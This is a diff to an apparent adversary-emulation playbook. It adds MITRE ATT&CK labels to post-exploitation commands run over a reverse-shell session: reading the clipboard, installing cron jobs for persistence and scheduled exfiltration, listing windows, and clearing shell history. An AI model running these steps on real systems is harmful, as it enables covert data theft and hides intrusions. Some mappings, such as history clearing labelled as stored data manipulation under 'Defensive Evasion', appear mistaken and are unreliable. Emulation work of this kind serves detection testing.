@@ -714,7 +714,9 @@ commands:
     session: revshell
     cmd: xclip -selection clipboard -o
     metadata:
-      techniques: "T1515"
+      techniques: "T1115"
+      tactics: "Collection"
+      technique_name: "Clipboard Data"
 
   # make the veiltransfer client binary executable
   - type: msf-session
@@ -726,7 +728,9 @@ commands:
     session: revshell
     cmd: (crontab -l; cat /home/judy/crontab.txt) | crontab -
     metadata:
-      techniques: "T1053"
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
 
   # add the cronjob to extract data
   - type: msf-session
@@ -734,20 +738,26 @@ commands:
     cmd: (crontab -l; cat /home/judy/downloader.txt) | crontab -
     metadata:
       techniques: "T1029"
+      tactics: "Exfiltration"
+      technique_name: "Scheduled Transfer"
 
   # find out which windows are open
   - type: msf-session
     session: revshell
     cmd:  wmctrl -l
     metadata:
-      techniques: "T010"
+      techniques: "T1010"
+      tactics: "Discovery"
+      technique_name: "Application Window Discovery"
 
   # clear history
   - type: msf-session
     session: revshell
     cmd: history -c
     metadata:
-      techniques: "T1565"
+      techniques: "T1565.001"
+      tactics: "Defensive Evasion"
+      technique_name: "Data Manipulation: Stored Data Manipulation"
 
   # exit the interactive shell
   - type: msf-session
